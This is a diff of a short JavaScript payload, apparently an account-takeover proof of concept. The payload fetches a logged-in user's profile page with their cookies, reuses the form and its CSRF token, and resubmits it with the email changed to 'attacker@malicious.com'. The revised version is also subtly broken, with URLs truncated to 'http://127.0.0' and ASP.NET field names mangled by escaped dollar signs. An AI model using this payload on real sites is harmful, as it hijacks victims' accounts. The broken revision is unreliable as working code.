@@ -1,34 +1,43 @@
-;(async()=>{
-  // Fetch the account page to get valid form values
-  const html = await fetch("http://127.0.0.1:5000/profile", {
-    credentials: "include"  // Include cookies for authenticated request
-  }).then(r=>r.text());
+;(async () => {
+  try {
+    // 1. Fetch the profile page
+    const html = await fetch("http://127.0.0", { credentials: "include" })
+      .then(r => {
+        if (!r.ok) throw new Error(`HTTP error! Status: ${r.status}`);
+        return r.text();
+      });
 
-  // Parse the HTML response
-  const doc = new DOMParser().parseFromString(html,"text/html");
-  const form = doc.querySelector("form");
+    // 2. Parse the HTML
+    const doc = new DOMParser().parseFromString(html, "text/html");
+    const form = doc.querySelector("form");
+    
+    if (!form) {
+      throw new Error("Could not find a <form> element on the fetched page.");
+    }
 
-  // Get the form's action URL
-  const base = "http://127.0.0.1:5000/profile";
-  const action = new URL(form.getAttribute("action"), base).href;
+    // 3. Extract form parameters
+    const base = "http://127.0.0";
+    const action = new URL(form.getAttribute("action") || "", base).href;
+    const data = new FormData(form);
 
-  // Extract all form data (including CSRF tokens)
-  const data = new FormData(form);
+    // 4. Modify form values
+    data.set("__EVENTTARGET", "ctl00\$MainbtnSavebtnPrimary");
+    data.set("__EVENTARGUMENT", "");
+    data.set("ctl00\$MaintxtEmailtxtText", "attacker@malicious.com");
 
-  // Set the target button that would normally be clicked
-  data.set("__EVENTTARGET", "ctl00$Main$btnSave$btnPrimary");
-  data.set("__EVENTARGUMENT", "");
-  
-  // Change the email to one we control
-  data.set("ctl00$Main$txtEmail$txtText", "attacker@malicious.com");
+    // 5. Submit the form
+    const res = await fetch(action, { 
+      method: "POST", 
+      credentials: "include", 
+      body: data 
+    });
 
-  // Submit the modified form
-  const res = await fetch(action, {
-    method: "POST",
-    credentials: "include",
-    body: data
-  });
+    console.log(res.ok ? "Profile updated successfully!" : "Failed to update profile", res.status);
 
-  console.log(res.ok ? "Profile updated successfully!" : "Failed to update profile", res.status);
+  } catch (error) {
+    // This will catch and print any failure (network, null pointers, etc.)
+    console.error("Script execution failed:", error);
+  }
 })();
+
 
